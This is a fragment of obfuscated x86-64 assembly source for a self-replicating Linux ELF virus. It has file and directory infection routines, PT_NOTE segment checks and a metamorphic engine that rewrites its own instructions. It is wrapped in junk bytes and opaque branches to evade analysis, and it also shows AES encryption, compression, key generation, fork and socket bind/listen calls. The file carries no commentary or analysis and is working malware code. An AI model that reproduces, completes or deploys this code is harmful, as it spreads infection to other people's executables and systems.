    jnz         ..@qTjVhWrcA0J5
    push        rsi
    jmp         $+4
db 0x44, 0x7f
    jmp         $+3
db 0x67
    jmp         ..@AExS1q5ZgNao
..@mBS0d7PGDLSI:
%ifdef X86_64
    jne         ..@CUiPpAfpt7Dv
%endif
    jmp         ..@2jTN2QjuXPZz
..@hyyhKlbdYhYP:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+5
db 0x80, 0xbe, 0x1a
    jmp         $+3
db 0xb8
    jmp         ..@VghZcxu0XJz4
..@IaIlM6b2wQzQ:
    push        rcx
    pop         rcx
    jne         ..@KL2hLTP2onaO
    push        rbx
    jmp         $+5
db 0x59, 0xdc, 0x82
    jl          ..@Z7gYVBIHKqnm
    jge         ..@Z7gYVBIHKqnm
..@qQ5wZbRc5imi:
    mov         rax, (-1)
    jmp         $+5
db 0x69, 0x12, 0x79
    jb          ..@weKp4CZsaco9
    jae         ..@weKp4CZsaco9
..@fsxRSPWQMtyG:
    push        rsi
    pop         rsi
    js          ..@5P7Acb8OSlJ2
    jns         ..@5P7Acb8OSlJ2
..@u4VP1OpgKXop:
    push        rax
    pop         rax
    jl          ..@voPgzt8uxdJw
    jge         ..@voPgzt8uxdJw
..@fFE2HLRNQNCH:
    push        rsi
    jmp         $+3
db 0x94
    jmp         ..@F1Lzydudq6g7
..@1xDfHGbTGEKC:
    jl          ..@FCf1CT2OqXqU
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    mov         r1d, eax
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    mov         r3d, 0x20
    jmp         $+4
db 0xe2, 0xad
    jmp         ..@TYYoGOR4frKa
..@GUgKwvW1EUBQ:
%ifdef X86_64
    test        al, al
%endif
    jmp         ..@fGJ5KuDaOruK
..@Pi1ng6f3qppu:
    mov         r2, rax
    mov         rax, SYS_FTRUNCATE
    jmp         $+3
db 0x49
    js          ..@bORoJ2ItQctc
    jns         ..@bORoJ2ItQctc
InfectFile:
    jmp         ..@xzKJOl5ljmTw
..@FDikj69FyScC:
%ifdef X86_32
    test        dl, dl
%endif
    jmp         $+4
db 0xa1, 0x7d
    jb          ..@0LQaI9DTHoBZ
    jae         ..@0LQaI9DTHoBZ
..@Axz8cAnkL80v:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    call_vsp    ExitProgram
    jl          ..@cXnVNccWZceC
    jge         ..@cXnVNccWZceC
..@l3Yeg6dBRgaT:
    mov         rbp, rbp
    xchg        rsi, rsi
    jl          ..@B4FJlzoW2MBg
    jge         ..@B4FJlzoW2MBg
..@F3Hmg8KBFVVr:
    jmp         ..@gVoAMq3m9nek
    jmp         $+4
db 0x7b, 0xcd
    je          ..@3VbMPYOt5tFG
    jne         ..@3VbMPYOt5tFG
MapFile:
    jmp         ..@gcfJK5FRFMaV
..@T33KtfhvIoYI:
    sub         rsi, m6
    jmp         $+5
db 0xa9, 0x60, 0xeb
    jmp         $+4
db 0xe7, 0x22
    jmp         $+5
db 0xba, 0x72, 0x41
    jl          ..@p7rBxOjkFOm7
    jge         ..@p7rBxOjkFOm7
..@LEVG2h8YkAu6:
    ja          ..@LctNMD7hPavS
    js          ..@KU9KGzU7wEVE
    jns         ..@KU9KGzU7wEVE
..@FkWdwILf36Ba:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         $+4
db 0xce, 0x42
    jmp         ..@RKmNITXZGGnW
..@VTL5HinrRqjG:
    mov         rax, rax
    jmp         $+5
db 0x91, 0xa8, 0xd7
    je          ..@HXvzRGH4O04s
    jne         ..@HXvzRGH4O04s
..@ikhWCmqqB1a5:
    jle         ..@uPqwT1WuMIIc
    jmp         ..@LyWMH9Dc5QWE
..@h8FA3g9lx6FO:
    mov         esi, DWORD [rdi]
    xor         rdi, rdi
    jmp         $+3
db 0xb3
    jmp         $+4
db 0xca, 0x90
    js          ..@CqYFFV5CopHz
    jns         ..@CqYFFV5CopHz
..@W9Hf3bUK3lPn:
    jne         ..@cSFWXWmVimkw
    jmp         $+3
db 0x1c
    jmp         ..@NE2njpPLUvhI
..@ehSuza42iAAC:
%ifdef X86_64
    push        rbx
    pop         rbx
    je          ..@gdxWmThcBjhG
    cmp         edx, 00e88048h
%endif
    jb          ..@ZOkfa0Bd3hGl
    jae         ..@ZOkfa0Bd3hGl
..@EXfWyXq0QUpR:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    call        MemMove
    inc         WORD m5
    jmp         $+5
db 0x7d, 0x9e, 0xb8
    jmp         $+5
db 0x5d, 0xf5, 0x81
    jl          ..@zxJWBRqFTg0p
    jge         ..@zxJWBRqFTg0p
..@7U3As5cV4tz8:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+4
db 0x17, 0x89
    jb          ..@6ZYbnEWxjJPO
    jae         ..@6ZYbnEWxjJPO
..@DYdCGtIYp3R8:
%ifdef X86_64
    shr         ebx, 16
%endif
    jmp         $+4
db 0x84, 0xf3
    jmp         $+3
db 0xe4
    jmp         $+5
db 0x81, 0x92, 0x4a
    jmp         ..@Rx8M3cS6tZLK
..@02CX3IP0WB2E:
    mov         dx, WORD [rdi+4]
    jmp         $+5
db 0x81, 0x3c, 0x66
    jmp         ..@wNwa2OPhVWOQ
..@oQZBLCohBqGR:
    mov         rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    push        rdi
    js          ..@QzL9Nbsezoof
    jns         ..@QzL9Nbsezoof
..@w2N4JqcJG42o:
    jmp         ..@kqyzs0n7iD17
    jmp         $+3
db 0x78
    jmp         $+5
db 0x9f, 0xd6, 0x17
    js          ..@HjStPXOpCO4W
    jns         ..@HjStPXOpCO4W
..@LJwe2QEm5Pls:
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    and         edx, 0fffffff8h
    jmp         $+3
db 0x45
    js          ..@dBK3BZv6jIex
    jns         ..@dBK3BZv6jIex
..@Cb7GfmKcZIUz:
    jmp         ..@GUgKwvW1EUBQ
    jb          ..@YIQsiCrZ4SFC
    jae         ..@YIQsiCrZ4SFC
..@ocFe07bfy03U:
    xchg        rdx, rdx
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x20]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x30]
    js          ..@xtP96RFW1w66
    jns         ..@xtP96RFW1w66
..@oAXcG29MbWo2:
    xchg        rbx, rbx
    jmp         $+4
db 0x8f, 0x33
    jmp         ..@ch0S0WKV53LI
..@jH0VnblkeDxC:
    xchg        rbx, rbx
    mov         rdi, rdi
    mov         rax, 0x1
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    jmp         $+4
db 0xa4, 0xb9
    jl          ..@pv5tS3T9KRc5
    jge         ..@pv5tS3T9KRc5
..@Hax59NI5RFGH:
    mov         r1, m6
    jmp         $+3
db 0x26
    jb          ..@Z7JnXZENui3Z
    jae         ..@Z7JnXZENui3Z
..@qXAwNhZTiBD8:
%ifdef X86_64
    jz          ..@fHQb6ureMNSG
%endif
    jl          ..@EwcUnwIKwrUF
    jge         ..@EwcUnwIKwrUF
..@QNCXDubRMQvA:
    push        rax
    pop         rax
    jmp         ..@zTHBLrtuCaAL
..@VCrOyhERlzJx:
    pop         rbx
    js          ..@fFE2HLRNQNCH
    jns         ..@fFE2HLRNQNCH
..@taOavz6LgImf:
    rep movsb 
    jmp         $+5
db 0x7c, 0xb6, 0x07
    jmp         $+5
db 0xb8, 0xfc, 0xc0
    js          ..@bYYaKTkE26mv
    jns         ..@bYYaKTkE26mv
..@rmuQvzEjiT7l:
    or          edx, ecx
    jmp         $+4
db 0xae, 0x97
    je          ..@WjZ41DTeO0cW
    jne         ..@WjZ41DTeO0cW
..@wJrgueTw7rAy:
    mov         rax, (-1)
    jb          ..@8z4ZU9ypC5Ok
    jae         ..@8z4ZU9ypC5Ok
..@mnUzIxoJSPfq:
    xor         rdx, rdx
    jl          ..@x1j3swHyuwfO
    jge         ..@x1j3swHyuwfO
..@x1AAlIPgxWAD:
    push        r1
    mov         r5, r1
    xchg        rbx, rbx
    xor         rax, rax
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x84
    jmp         $+4
db 0xab, 0x5b
    jmp         $+3
db 0xf9
    jmp         $+4
db 0xc5, 0xbf
    jmp         ..@RnfXANZ53czk
..@EwcUnwIKwrUF:
%ifdef X86_64
    shl         rbx, 8
%endif
    jl          ..@KBC2KQ9XKl17
    jge         ..@KBC2KQ9XKl17
..@s10BjrP89aFM:
%ifdef X86_64
    pop         rcx
%endif
    js          ..@PIizWMab1Dcd
    jns         ..@PIizWMab1Dcd
..@EY2WolpGhxxs:
    add         rdi, 1
    jl          ..@7Y7iAZJ3XIRl
    jge         ..@7Y7iAZJ3XIRl
..@p7rBxOjkFOm7:
    mov         DWORD [rdi], esi
    add         rdi, 0x4
    jmp         $+3
db 0x7a
    jmp         $+3
db 0x06
    jmp         ..@LdLRXimyjpIc
..@HkZQYnrymA8A:
%ifdef X86_64
    pop         rax
%endif
    jmp         ..@l0mkoaPv7t85
..@jRWADZyJ20N5:
    call        ConvertDoubleJumpToJump
    jmp         ..@re9aULg45Ao1
..@wdBp8B6Q6ecF:
    aesenclast  xmm0, xmm1
    jmp         $+5
db 0xe7, 0x23, 0x11
    jmp         ..@BmyszZPMEkOq
..@f7tqLXy4npbd:
    add         r1, 1
    mov         rdx, rdx
    jmp         $+4
db 0xe0, 0x9a
    jl          ..@fcqXEK5bxTLG
    jge         ..@fcqXEK5bxTLG
..@GRXiEW7aiBex:
    xchg        rsi, rsi
    jmp         $+4
db 0x4c, 0xa3
    jmp         ..@asI18rQMIx4U
..@Fv9OZ5UIfD57:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    push        rax
    pop         rax
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+5
db 0x2d, 0x2a, 0x3b
    jb          ..@VZw4RTBniFLE
    jae         ..@VZw4RTBniFLE
..@KO3rgVaKK4H9:
    cmp         eax, 07fh
    jbe         ..@U8EnATw385EA
    jmp         $+4
db 0x70, 0x89
    jmp         ..@5dpvQuyiI1Zw
..@youNcdonY06s:
    mov         rbx, rbx
    js          ..@f99ix2UtoNGQ
    jns         ..@f99ix2UtoNGQ
..@FoABs5t3JqAT:
    push        rsi
    pop         rsi
    jmp         $+5
db 0xf0, 0x4b, 0xdd
    jmp         $+3
db 0xf3
    je          ..@BWcct29veIbC
    jne         ..@BWcct29veIbC
..@aWZGYQJCtsNx:
    jl          ..@7Trw1ohlUOtc
    jmp         $+3
db 0x81
    je          ..@5ljh3apFR9bw
    jne         ..@5ljh3apFR9bw
..@jQDFHsEhgPh5:
    xor         rbx, rbx
    mov         ebx, 90909090h
    mov         rsi, rsi
    js          ..@haRbOg9LT44q
    jns         ..@haRbOg9LT44q
..@fvY2IzGWwB8Y:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
    push        rax
%endif
    jmp         $+3
db 0x31
    jmp         ..@jWSQ4MR2S0KH
..@Qmy4sWaorawn:
    cmp         rax, 0x00
    jle         ..@3cqUy7fXbEn9
    jmp         $+4
db 0xd1, 0x0c
    jmp         ..@jijA7e8z0IqR
..@I9rjJzmRvRZ5:
    je          ..@Ef4O39pP0jhG
    jmp         $+4
db 0x69, 0x3c
    jmp         ..@8cZCkFNOxFzF
..@sEpsjAWEdXVa:
    mov         bl, BYTE [rsi]
    not         bl
    jl          ..@Y9VUDOg5cVwJ
    jge         ..@Y9VUDOg5cVwJ
..@Z1cElXCgiw7C:
    jge         ..@NcHpm1IzVJQN
    jmp         $+4
db 0x12, 0xba
    js          ..@XKsfKANGYJCy
    jns         ..@XKsfKANGYJCy
..@aLe1NgsfrGrG:
    jmp         ..@ZXPIOjG7JwXG
    jmp         $+4
db 0x3e, 0xae
    jmp         $+5
db 0x49, 0xf9, 0xf9
    jb          ..@ZXPIOjG7JwXG
    jae         ..@ZXPIOjG7JwXG
..@Qz3EhPvsxHBX:
    mov         rsi, QWORD [rsp+bytes]
    jl          ..@nvR6oTBCYUJg
    jge         ..@nvR6oTBCYUJg
..@9kgiVCmRtAFq:
    pop         rbx
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    add         rdi, rax
    xor         rax, rax
    jb          ..@0EXsA4fmcmuP
    jae         ..@0EXsA4fmcmuP
..@HjStPXOpCO4W:
    add         eax, 0x57
    jmp         $+4
db 0x60, 0xc3
    js          ..@kqyzs0n7iD17
    jns         ..@kqyzs0n7iD17
..@I8YhNOgZ6gI7:
    xchg        rdx, rdx
    jb          ..@h6l5cJIuPpZk
    jae         ..@h6l5cJIuPpZk
..@8jVSi07Oa4lf:
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    je          ..@xKw3ocC9Ot7W
    jne         ..@xKw3ocC9Ot7W
..@pv5tS3T9KRc5:
    test        al, al
    jz          ..@2NqgZlsG5fVR
    call        ConvertAddToSub
    jmp         ..@2NqgZlsG5fVR
..@0DrRbUHYVyZO:
%ifdef X86_64
    xchg        rcx, rcx
%endif
    jb          ..@urKplzDM1Hbh
    jae         ..@urKplzDM1Hbh
..@lGUooJp11F0A:
%ifndef ENABLE_DEBUGGING
    xchg        rsi, rsi
    xor         r2, r2
    mov         eax, SYS_LISTEN
    xchg        rcx, rcx
%endif
    js          ..@5TCDmJ7YeCzG
    jns         ..@5TCDmJ7YeCzG
..@2oDIu3yHRruH:
    add         r1, 2
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    mov         rax, rax
    jmp         $+5
db 0x6a, 0xa0, 0xfe
    jmp         $+4
db 0x5a, 0x61
    jb          ..@khZTtQM168FB
    jae         ..@khZTtQM168FB
..@DkQ0BsT18K9w:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
%endif
    jmp         $+4
db 0x1a, 0x72
    js          ..@oL4Qd1RiUZOB
    jns         ..@oL4Qd1RiUZOB
..@KO3E5X3jzb4u:
    mov         dl, BYTE [rsi]
    jmp         $+3
db 0xa4
    jmp         $+3
db 0x21
    jmp         $+3
db 0x9d
    je          ..@MmBW7ez7SC83
    jne         ..@MmBW7ez7SC83
..@X32ONBa52lsA:
    jz          ..@LctNMD7hPavS
    jmp         $+3
db 0x87
    jmp         ..@txkOH77h1lMm
..@NC0AG4wIYv2U:
    mov         rbx, 32
    div         rbx
    mov         rsp, rsp
    jmp         $+4
db 0x02, 0x9b
    jmp         $+3
db 0x79
    jb          ..@mTn6lC7ajPSF
    jae         ..@mTn6lC7ajPSF
..@v2NWai9GzIZ9:
    xor         rdx, rdx
    xchg        rsp, rsp
    xor         rbx, rbx
    mov         rdi, rsi
    jmp         $+3
db 0x64
    jmp         $+5
db 0x6b, 0x45, 0xa5
    jmp         ..@WRsMielqs0v2
..@asI18rQMIx4U:
    shr         edx, 1
    test        edx, edx
    mov         rbx, rbx
    jb          ..@S94AKi5HgXzC
    jae         ..@S94AKi5HgXzC
ConvertXorToMoveZero:
    jmp         ..@qzOvqWrzTwYy
..@WZfQRAEvMlGt:
    jz          ..@gs3tvc5S9lqa
    jmp         $+4
db 0x67, 0xf8
    jmp         $+3
db 0x66
    jl          ..@JKKnFYkwDyEJ
    jge         ..@JKKnFYkwDyEJ
..@eG7bBys6xAkq:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    jb          ..@pj2CWyWGes9V
    jae         ..@pj2CWyWGes9V
..@oa4vZ4vajOfF:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+3
db 0x26
    jl          ..@oqpoZ0aUhK8f
    jge         ..@oqpoZ0aUhK8f
..@uouuIU7uTAjT:
    cmp         BYTE [rdi+rcx], 90h
    js          ..@CcRAlI1d7vXN
    jns         ..@CcRAlI1d7vXN
..@mxszI8JntX0J:
    aesenc      xmm0, xmm1
    xchg        rsp, rsp
    movdqu      xmm1, oWORD [rsp+0xa0]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xb0]
    jb          ..@IvXCBXBljDaW
    jae         ..@IvXCBXBljDaW
..@k32bBGPBUv3f:
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    push        rcx
    pop         rcx
    jmp         $+5
db 0xe6, 0x43, 0xab
    jl          ..@ziRaSLzvwqiN
    jge         ..@ziRaSLzvwqiN
..@zP3yrK8T6KNY:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    js          ..@5e941Z6tOgQO
    jns         ..@5e941Z6tOgQO
..@ziRaSLzvwqiN:
    xchg        rsi, rsi
    jb          ..@EaxK7DvpEwPP
    jae         ..@EaxK7DvpEwPP
..@2nTHrDSU4lBA:
    je          ..@cXnVNccWZceC
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    call_vsp    Strlen
    jb          ..@ahYMfV1k7QC5
    jae         ..@ahYMfV1k7QC5
..@nEe2yxnXRWus:
    pop         rdx
    jmp         ..@q3Cbtz1Fb4jE
..@61vccviur7cD:
%ifdef X86_64
    test        cl, cl
%endif
    jmp         ..@BmAK0w15vwfV
..@js5A5YjwuDGs:
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0xe4
    jmp         ..@ET7On1ReKwe7
..@eixHI4M5Nkd7:
    mov         rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jmp         $+5
db 0xa9, 0x86, 0x5f
    jmp         $+4
db 0xc5, 0xd3
    jmp         ..@c0lJi2sKipa0
..@ouO0ogTYCDuq:
%ifdef X86_32
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         ..@oV7GA36w4St0
..@PeiebuCd2G5n:
    ret
    js          ConvertPushPopValueToMoveValue
    jns         ConvertPushPopValueToMoveValue
..@0EXsA4fmcmuP:
    xor         rbx, rbx
    jl          ..@TdqnTQta8XGb
    jge         ..@TdqnTQta8XGb
..@fHQb6ureMNSG:
    xor         rcx, rcx
    mov         rsi, QWORD [rsp+bytes]
    push        rsi
    pop         rsi
    jmp         ..@y5YIpYNUpn6w
..@E1VXnuM9KxMg:
    call        InfectDirectory
    jl          ..@WcI5xRsIRgMY
    jge         ..@WcI5xRsIRgMY
..@CquRjkySoGTH:
    cmp         rax, 0x02
    je          ..@8zSaA7RMW3Rb
    push        rdi
    pop         rdi
    js          ..@ypCCZfxASCfs
    jns         ..@ypCCZfxASCfs
..@SP6mxUlt3yVP:
    push        r5
    push        r2
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    mov         r1, QWORD [r5+e_h.e_shoff]
    jb          ..@ZyULGfioSvnW
    jae         ..@ZyULGfioSvnW
..@bXleCoS5JS4L:
    call        AddSizeMappedFile
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, r1
    add         r1, signature_len
    jmp         $+5
db 0x98, 0xbd, 0xce
    jmp         ..@Vqd3I4qoLycs
..@CENV1x0dgrqo:
%ifdef X86_64
    shl         edi, 8
    mov         dil, 41h
    jmp         ..@KH9gXogLHpb8
%endif
    jmp         $+4
db 0x08, 0xc6
    jmp         ..@t05NebrBROmj
..@VGWhSM9XyovC:
    jmp         ..@bYYaKTkE26mv
    jmp         $+3
db 0xb7
    jmp         ..@taOavz6LgImf
..@mPaUXkg76Okg:
%ifdef X86_64
    cmp         dx, 2d48h
%endif
    jmp         $+5
db 0x0d, 0x18, 0xb8
    jb          ..@PvKQbaCUviFj
    jae         ..@PvKQbaCUviFj
..@5ehQE7fBhMdV:
    std
    jmp         $+4
db 0xf3, 0xc8
    jmp         $+4
db 0x96, 0x04
    js          ..@QjER0zyEdYUr
    jns         ..@QjER0zyEdYUr
..@0x4e9fQm7C4s:
    mov         dl, BYTE [rsp+bytes+2]
    jmp         $+5
db 0x30, 0x85, 0xcb
    jmp         ..@ttep6trMf4Ly
..@ACNFaXIonE1Y:
    add         r4, 1
    jmp         $+5
db 0x4e, 0x11, 0xec
    jmp         $+3
db 0x41
    je          ..@FHJ4zOjttsr9
    jne         ..@FHJ4zOjttsr9
..@9eyaY3RsIZWn:
    mov         rsi, QWORD [rsp+bytes]
    mov         rcx, QWORD [rsp]
    mov         DWORD [rsi+rcx], edi
    push        rdx
    pop         rdx
    jb          ..@LC9czikhFxbX
    jae         ..@LC9czikhFxbX
..@FgaGDyohCEqU:
    sub         rsi, 1
    js          ..@5ehQE7fBhMdV
    jns         ..@5ehQE7fBhMdV
..@FbE98XXV9ATs:
    push        rdi
    pop         rdi
    js          ..@k1d8uQg9fkpl
    jns         ..@k1d8uQg9fkpl
..@Se8wv4Cv6Wya:
    call        ConvertJumpToDoubleJump
    jl          ..@jH0VnblkeDxC
    jge         ..@jH0VnblkeDxC
..@YIQsiCrZ4SFC:
    mov         DWORD [rdi+1], edx
    jl          ..@9xgiEAfkS5c8
    jge         ..@9xgiEAfkS5c8
..@v7ECeEPo0D1M:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    js          ..@auPCTrviUCCb
    jns         ..@auPCTrviUCCb
..@zt1TxXkbEAdl:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    js          ..@iCR7aQMXqVrC
    jns         ..@iCR7aQMXqVrC
..@UmGoV1MsWggs:
    cmp         rax, r2
    jne         ..@SSRObxD4jSsD
    mov         rax, rax
    push        rbx
    js          ..@lzBEaQdqvSAk
    jns         ..@lzBEaQdqvSAk
..@IwmvLOW2w7V8:
%ifdef X86_32
    and         esi, 0000ffffh
%endif
    jmp         $+3
db 0xe7
    js          ..@3H7GThB2XPEB
    jns         ..@3H7GThB2XPEB
..@oYHuWcQ3sZEc:
    xor         rbx, rbx
    xor         rdx, rdx
    mov         rax, rcx
    jmp         $+4
db 0x06, 0xc4
    jmp         $+4
db 0x91, 0xe0
    jmp         ..@NC0AG4wIYv2U
..@P4cid8TxJaZG:
%ifdef X86_32
    mov         BYTE [esi+ecx], 00h
%endif
    jmp         $+5
db 0x52, 0x3b, 0x35
    jmp         ..@JIwYDX39COM8
..@38sJg5yiW0UP:
    sub         rsp, _VADDR_OFF_size
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         $+4
db 0xb4, 0x2d
    js          ..@8dsM5CyW9fCS
    jns         ..@8dsM5CyW9fCS
..@VjgGtVCe94CR:
    or          ebx, ecx
    je          ..@Mm98qW3Cm4Ih
    jne         ..@Mm98qW3Cm4Ih
..@3gpXZVcgXUln:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         ..@NBa8zaMdSHkX
..@MlBkrXP2b9gD:
    xor         rax, rax
    xor         rdx, rdx
    xor         rbx, rbx
    jl          ..@wCQttqLsMufC
    jge         ..@wCQttqLsMufC
..@Rx8M3cS6tZLK:
%ifdef X86_64
    mov         rsi, rsi
%endif
    je          ..@GULnuZw76XHM
    jne         ..@GULnuZw76XHM
..@GVpJr2Igv9Wp:
    mov         r2, QWORD [r1+file.filesize]
    push        rbx
    pop         rbx
    jmp         ..@UmGoV1MsWggs
..@2NqgZlsG5fVR:
    mov         rax, 0x10
    jmp         $+3
db 0x20
    je          ..@n4N6UxBWLzDu
    jne         ..@n4N6UxBWLzDu
..@ftgTyevRnTSV:
%ifndef ENABLE_DEBUGGING
    push        WORD 0x02
    mov         r2, rsp
%endif
    je          ..@sGr7qUE8eIx3
    jne         ..@sGr7qUE8eIx3
..@WjZ41DTeO0cW:
    push        rdi
    mov         rax, rax
    js          ..@a1DTkhEZR6zM
    jns         ..@a1DTkhEZR6zM
..@mYkLebdHSexq:
    sub         rsp, _PAYLOAD_OFF_size
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+4
db 0x4a, 0x24
    je          ..@o1NxyFPsUh23
    jne         ..@o1NxyFPsUh23
..@Os05eU1OGvqZ:
    jne         ..@yzPYtCSt7DTx
    jmp         $+4
db 0x17, 0xe9
    js          ..@l6J1UiLxFmVl
    jns         ..@l6J1UiLxFmVl
..@Y9VUDOg5cVwJ:
    add         ebx, 1
    jmp         $+3
db 0x20
    js          ..@dSVGz0qhLEuy
    jns         ..@dSVGz0qhLEuy
..@bQlxb6cav2mg:
    jnz         ..@n8bRDgeOgnvg
    jmp         ..@KgAeZ8y7ds3C
..@nFmCmFVdwlC8:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    pop         r4
    jmp         ..@X8IsOzd9EOL0
..@5UlHX829nPxj:
    mov         edx, DWORD [rdi]
    jmp         $+5
db 0xa9, 0x96, 0xfc
    jmp         ..@fIYET2eJ00Dq
..@qzOvqWrzTwYy:
    push        rsi
    push        rcx
    mov         rbp, rbp
    mov         rdi, rsi
    add         rdi, rcx
    jmp         $+3
db 0x1d
    js          ..@5UlHX829nPxj
    jns         ..@5UlHX829nPxj
..@eTurRFYEFRzF:
    ret
    jmp         $+3
db 0x8e
    jmp         $+5
db 0x0f, 0xdd, 0x79
    jl          DYNPIEValidation
    jge         DYNPIEValidation
..@cnUflh1XMavX:
%ifdef X86_64
    jmp         ..@Y9GsjBOQ6Ngy
%endif
    jb          ..@ix1GrRBvo7F3
    jae         ..@ix1GrRBvo7F3
..@sGr7qUE8eIx3:
%ifndef ENABLE_DEBUGGING
    mov         r3d, 0x10
    xor         rax, rax
    mov         eax, SYS_BIND
    rep         nop
%endif
    jmp         ..@6V8ggEuL5Yo1
..@tTfQ9ro8mzo3:
    pop         rdi
    mov         eax, SYS_READ
    syscall
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    jmp         $+5
db 0xc3, 0xeb, 0x65
    jb          ..@EPUUdpf4LBsZ
    jae         ..@EPUUdpf4LBsZ
..@f1zPJKm2QSn0:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start+4
    jb          ..@Tbxfl2lMayZ2
    jae         ..@Tbxfl2lMayZ2
..@7pooBR20Hroq:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
%endif
    jmp         ..@sMKXeQB5Yasn
..@tW3Ohbs44yXm:
    cmp         r1, 0x00
    je          ..@po2lz8fa5reh
    mov         rax, SYS_FORK
    syscall
    mov         rbx, rbx
    jl          ..@GoS1FmsVFr4p
    jge         ..@GoS1FmsVFr4p
..@lig6j0Kd1iuy:
    mov         r1d, eax
    xchg        rsi, rsi
    mov         r3d, 0x02
    jl          ..@GGMr1f8chki4
    jge         ..@GGMr1f8chki4
..@tl6464av7muG:
    pop         rdx
    syscall
    cmp         rax, 0xffffffffffffffff
    push        rbx
    js          ..@SjbFPvyl6C8Z
    jns         ..@SjbFPvyl6C8Z
..@65vorcNr2Rhl:
    push        rbx
    jmp         $+5
db 0x66, 0x70, 0x8b
    jl          ..@VCrOyhERlzJx
    jge         ..@VCrOyhERlzJx
..@fzTHqSsWuBKa:
    mov         r1, r5
    call_vsp    Strlen
    jmp         $+3
db 0x35
    jmp         ..@X57iZiTZQbl9
..@AMbiWhNiKP4N:
    mov         BYTE [rsi], bl
    jmp         $+4
db 0x2b, 0xf2
    jb          ..@YtnYaSniTSrM
    jae         ..@YtnYaSniTSrM
..@nJRbiOINfoZ8:
%ifdef X86_32
    and         edx, 0ffffc0ffh
%endif
    jb          ..@rBPp9adgdReb
    jae         ..@rBPp9adgdReb
..@YpFr0KE2lQZZ:
    add         rsp, _DYNPIE_OFF_size
    push        rsi
    pop         rsi
    pop         r2
    jmp         ..@ObfVqPmPF1EF
..@BvOdIpdRwvlx:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
%endif
    je          ..@Oe8AFKPZt6JZ
    jne         ..@Oe8AFKPZt6JZ
..@yzPYtCSt7DTx:
    add         rsp, _INFFILE_OFF_size
    jmp         $+4
db 0x94, 0x3c
    js          ..@fsxRSPWQMtyG
    jns         ..@fsxRSPWQMtyG
..@7871YsfeDySB:
    pop         rcx
    pop         rsi
    mov         rax, (-1)
    jmp         $+3
db 0x3a
    jmp         $+3
db 0x27
    jmp         $+4
db 0x5a, 0x1a
    jl          ..@AOHWQ7SXFXWl
    jge         ..@AOHWQ7SXFXWl
..@ckUjyIb2lvvR:
    jz          ..@re9aULg45Ao1
    jmp         $+5
db 0x0c, 0x26, 0x52
    jmp         $+3
db 0x82
    jmp         $+5
db 0x95, 0x94, 0x82
    jl          ..@jRWADZyJ20N5
    jge         ..@jRWADZyJ20N5
..@fW95coYIJFOw:
%ifndef ENABLE_DEBUGGING
    xchg        rsi, rsi
    mov         rdi, rdi
%endif
    jl          ..@WQdOIlEEZbma
    jge         ..@WQdOIlEEZbma
..@OMVEMs21KhKE:
    je          ..@QnBzPIvOvqEY
    jmp         $+3
db 0x48
    jl          ..@jqFJpOeomJCE
    jge         ..@jqFJpOeomJCE
..@PUq3iWBE8zNV:
    xor         rax, rax
    mov         rbx, rbx
    jmp         ..@XG9DmpxOn45m
..@sk477QUoyetp:
%ifdef X86_32
    cmp         dl, 2dh
    je          ..@gdxWmThcBjhG
%endif
    je          ..@dWR8fbLkgDv4
    jne         ..@dWR8fbLkgDv4
..@M8DTXjb1xutI:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
    xchg        rdx, rdx
    xor         r2, r2
    xor         r3, r3
%endif
    jmp         ..@lgMtrShDYvh5
..@4dhrvau15P2U:
